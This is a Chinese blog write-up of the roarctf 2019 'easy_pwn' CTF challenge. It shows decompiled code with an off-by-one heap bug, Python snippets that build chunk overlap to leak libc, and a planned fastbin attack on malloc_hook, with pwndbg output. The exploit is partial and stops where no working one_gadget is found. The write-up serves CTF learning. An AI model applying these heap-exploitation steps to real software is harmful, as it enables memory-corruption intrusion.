



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="writeup" />


<link rel="canonical" href="http://example.com/2022/03/21/roarctf-2019-easypwn/">



  <title>
roarctf_2019_easypwn - pwn |
dreamcat = 我他喵的</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">roarctf_2019_easypwn
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-03-21 23:38:20">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-03-21T23:38:20+08:00">2022-03-21</time>
  </span>
  <span class="item" title="Symbols count in article">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">Symbols count in article</span>
    <span>15k</span>
    <span class="text">words</span>
  </span>
  <span class="item" title="Reading time">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">Reading time</span>
    <span>14 mins.</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeuibk9fj20zk0m8ay2.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclxxcb6rj20zk0m8b29.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giph47e9vtj20zk0m8x6l.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicit4jrvuj20zk0m8785.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipet4bz0yj20zk0m8e81.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/pwn/" itemprop="item" rel="index" title="In pwn"><span itemprop="name">pwn</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/21/roarctf-2019-easypwn/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="dreamcat">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="我他喵的">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="这次的题比较难搞但是攻击点挺单一过程中里到了2个手法"><a class="markdownIt-Anchor" href="#这次的题比较难搞但是攻击点挺单一过程中里到了2个手法">#</a> 这次的题比较难搞，但是攻击点挺单一，过程中里到了 2 个手法</h1>
<h2 id="环境以及保护"><a class="markdownIt-Anchor" href="#环境以及保护">#</a> 环境以及保护</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/buuoj/roarctf_2019_easy_pwn$ checksec --file=roarctf</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/Desktop/buuoj/roarctf_2019_easy_pwn/roarctf&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>保护全开了，那么我们只能考虑劫持 malloc_hook, 或者 IO_FILE。这里我还是优先考虑了劫持 mallochook，使用 onegadget。还是因为 buuoj 不给 libc，虽然 ubuntu16 的 docker 容器中 glibc 通常为 ubunt11.2 或者 ubuntu11.3，但是这里还是不行，猜测可能是 11.1 的版本，这里就不过多的猜测了，泄露版本永远都不是重点和难点。</p>
<h3 id="题目主要代码"><a class="markdownIt-Anchor" href="#题目主要代码">#</a> 题目主要代码</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Note system&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. create a note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. write note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. drop the note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. show the note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;choice: &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实每次看这个 menu 的页面，就可以知道重点关注什么地方了。这个题呢，还是毕竟规矩的创建，编辑，输出，删除。考虑几个点有没有溢出，有没有 UAF.</p>
<p>很遗憾这个题并没有太多的机会，只有 1 字节溢出，free 后指针清空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_C46</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;inuse + <span class="number">4</span> * i);</span><br><span class="line">    <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      size = getnum(v2);</span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">          size = <span class="number">0x1000</span>;</span><br><span class="line">        v4 = <span class="built_in">calloc</span>(size, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *((_DWORD *)&amp;inuse + <span class="number">4</span> * i) = <span class="number">1</span>;</span><br><span class="line">        *((_DWORD *)&amp;Size + <span class="number">4</span> * i) = size;</span><br><span class="line">        <span class="built_in">list</span>[<span class="number">2</span> * i] = v4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;the index of ticket is %d \n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">read_content</span><span class="params">(__int64 a1, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v4; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( size &gt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(<span class="number">0</span>, (<span class="type">void</span> *)(v3 + a1), size - v3);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">      v3 += v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">read_size</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; (<span class="type">int</span>)a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;                   <span class="comment">// off_by_one</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//write_note</span></span><br><span class="line">__int64 <span class="title function_">sub_E82</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  size = getnum(v1);</span><br><span class="line">  idx = size;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt;= <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    size = *((_DWORD *)&amp;inuse + <span class="number">4</span> * size);</span><br><span class="line">    <span class="keyword">if</span> ( size == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      size = getnum(<span class="number">1</span>);</span><br><span class="line">      v4 = read_size(*((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;Size + <span class="number">4</span> * idx), (<span class="type">unsigned</span> <span class="type">int</span>)size);<span class="comment">// 存在1字节溢出</span></span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        size = read_content(<span class="built_in">list</span>[<span class="number">2</span> * idx], v4); <span class="comment">// 不能输入少于size的内容</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//drop note</span></span><br><span class="line">__int64 <span class="title function_">sub_F8E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  idx = getnum(v3);</span><br><span class="line">  v4 = idx;</span><br><span class="line">  v2 = idx;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0LL</span> &amp;&amp; idx &lt;= <span class="number">15LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *((<span class="type">int</span> *)&amp;inuse + <span class="number">4</span> * idx);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)&amp;inuse + <span class="number">4</span> * idx) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)&amp;Size + <span class="number">4</span> * idx) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)<span class="built_in">list</span>[<span class="number">2</span> * idx]);</span><br><span class="line">      <span class="built_in">list</span>[<span class="number">2</span> * v2] = <span class="number">0LL</span>;                       <span class="comment">// 不存在uaf</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">output_content</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v4; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( a2 &gt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = write(<span class="number">1</span>, (<span class="type">const</span> <span class="type">void</span> *)(v3 + a1), a2 - v3);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">      v3 += v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v2 = getnum(v1);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *((_DWORD *)&amp;inuse + <span class="number">4</span> * v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      v2 = output_content(<span class="built_in">list</span>[<span class="number">2</span> * v3], *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;Size + <span class="number">4</span> * v3));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码实现的逻辑还算比较哇民政，没有太大的问题。由于题目保护全开了，操作空间就很小。唯一的漏洞还非常明显 if (a2 - a1 == 10)<br>
 LODWORD (result) = a1 + 1;   其中 a1 是我们创建时输入的 size，a2 是我们进行 write 时输入的 size，经典的手法创建时是不进行 16 字节对齐，卡最大的堆块界限，0x88，write 时只要输入的时 0x88+10 ，就可以实现 1 字节的溢出。</p>
<h2 id="解题"><a class="markdownIt-Anchor" href="#解题">#</a> 解题：</h2>
<h3 id="泄露地址"><a class="markdownIt-Anchor" href="#泄露地址">#</a> 泄露地址</h3>
<p>因为题目在申请堆块的时候，使用的是 calloc，会对返回的堆块进行初始化。所以我们必须构造的时堆块的重叠或者重复使用</p>
<p>这里我们只着重介绍两种手法的实现，就不具体展示利用过程了，因为流程比较固定；</p>
<h3 id="unlink"><a class="markdownIt-Anchor" href="#unlink">#</a> unlink</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x88</span>)			<span class="comment">#泄露</span></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x68</span>+<span class="number">10</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x61</span>+p64(<span class="number">0x190</span>)+<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>这个是经典的套路了，利用 unsortedbins 的双链表绕过 unlink 的检查，成功的 chunk0 合并到 topchunk，作为新的 topchunk, 这个时候 chunk1 仍在使用，但是被包含进了 topchnk，那么我们下面如果重复申请 add (0x88),add (0x18), 就可以在 bss 的链表中两次利用了，人为的 uaf，这里的话呢，我写的 0x18 比较小，可以写大点，比如 0x88，然后重复申请后，有两个地方的指针指向这块区域，释放一个，用另外一个进行泄露（因为 0x91 的大小又被写进了 unsortedbins）这样有了 libc 的基地址。通过上述流程我们就是实现了人为的 uaf。如果我们话存在一个 0x70 大小的堆块的重复利用，就可以进行 fastbinsattack，将 malloc_hook-0x23 写入 fastbins，然后就可以可以申请出来实现 malloc_hook 的劫持。</p>
<p>这个操作就很经典了，劫持 malloc_hook 后查看栈的结构，寻找满足要求的 onegadegt</p>
<h3 id="瞎操作"><a class="markdownIt-Anchor" href="#瞎操作">#</a> 瞎操作</h3>
<p>我在第一次进行 unlink 操作时，因为不仅修改了后面堆块的堆头，还修改了假 tophcunk 的堆头，同样想利用 unsortedbin 的双链表绕过检查，但是失败了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\xb0&#x27;</span>)</span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x18</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xb0</span>)+<span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>)</span><br></pre></td></tr></table></figure>
<p>但是，却误打误撞的绕过了 unsortedbins 的检查，如果释放 1，然后修改他的 size（0x90—&gt;0xb0）, 期望能够切割堆块 (0x90)，然后剩下的 0x20 会被加入对应的 bins，这里会报错我还没有搞清楚原因，报错的信息大概是 prevsize 不合法。</p>
<p>然后我的瞎操作就饶过了一系列的检查，虽然没能构造新的 topchunk, 但是 chunk1 的紧邻堆块 2 是我们在使用的，当我们 add (0x88)，会对其进行切割，剩下的 0x20 会进入 unsortedbin 的双链表，而这剩下的就是我们使用的 chunk2，这样 chunk 的 fd,bk 指针指向 main_arena，这样既可以完成了泄露</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55ad680a80b0</span> —▸ <span class="number">0x7f39d1cdab78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55ad680a80b0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">2</span>gx <span class="number">0x55ad680a80b0</span></span><br><span class="line"><span class="number">0x55ad680a80b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
<p>然后申请出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55ad67ba8040</span>:	<span class="number">0x0000001800000001</span>	<span class="number">0x000055ad680a8010</span></span><br><span class="line"><span class="number">0x55ad67ba8050</span>:	<span class="number">0x0000008800000001</span>	<span class="number">0x000055ad680a8030</span></span><br><span class="line"><span class="number">0x55ad67ba8060</span>:	<span class="number">0x0000001800000001</span>	<span class="number">0x000055ad680a80c0</span></span><br><span class="line"><span class="number">0x55ad67ba8070</span>:	<span class="number">0x0000001000000001</span>	<span class="number">0x000055ad680a80c0</span></span><br></pre></td></tr></table></figure>
<p>就可以重复利用，我们利用 chunk1 来修改 chunk 的 size（0x21----&gt;0x71），这样当 chunk2 释放后门进入 fastbin, 利用 chunk3 修改 fd 指针，就把 malloc_hook 链接入 fastbins。free chnnk  进入 fastbins 时，要保证 chunk 的下一个 chunk 合法，但是只会检查 size，这里我直接申请一个堆块绕过，后面申请到 aimed_chunk 就比较简单了。</p>
<p>最后就是这个 onegadegt 了，很不幸这里没有合适的</p>
